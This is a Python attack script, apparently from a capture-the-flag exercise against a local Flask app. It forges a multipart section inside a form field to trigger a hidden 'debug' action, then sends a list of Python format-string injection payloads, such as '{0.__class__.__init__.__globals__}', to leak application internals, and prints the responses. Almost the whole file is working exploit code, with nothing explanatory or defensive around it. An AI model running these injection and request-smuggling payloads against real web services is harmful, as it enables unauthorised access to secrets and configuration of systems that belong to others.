import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 研究 format string 的高级用法

# Python format string 支持:
# {field!conversion:spec}
# conversion: r (repr), s (str), a (ascii)
# spec: 填充、对齐、宽度、精度等

# 重要：某些对象的 __format__ 方法可能有特殊行为！

payloads = [
    # 基础测试
    ('{0!r}', 'app repr'),
    ('{0!s}', 'app str'),
    
    # 检查 __format__ 的特殊行为
    ('{0:}', 'app with empty spec'),
    
    # 尝试访问特殊属性
    ('{0.__class__.__init__.__globals__}', 'Flask init globals'),
    
    # 检查是否有 generator 或 iterator
    ('{0.url_map.iter_rules}', 'url_map iter_rules'),
    
    # 检查 jinja2 的缓存
    ('{0.jinja_env.bytecode_cache}', 'bytecode_cache'),
    
    # 检查 app 的 _got_first_request
    ('{0._got_first_request}', '_got_first_request'),
    
    # 检查 static 目录
    ('{0.has_static_folder}', 'has_static_folder'),
    
    # 检查 url_map 的规则
    ('{0.url_map._rules_by_endpoint}', 'rules_by_endpoint'),
    
    # 检查 jinja2 的 auto_reload
    ('{0.jinja_env.auto_reload}', 'jinja auto_reload'),
    
    # 检查模板
    ('{0.jinja_env.get_template}', 'get_template method'),
    
    # 检查 loader
    ('{0.jinja_env.loader.list_templates}', 'list_templates method'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:500] if len(result) > 500 else result
        print(f"[{desc}]: {result}")
    except Exception as e:
        print(f"[{desc}]: Error - {e}")
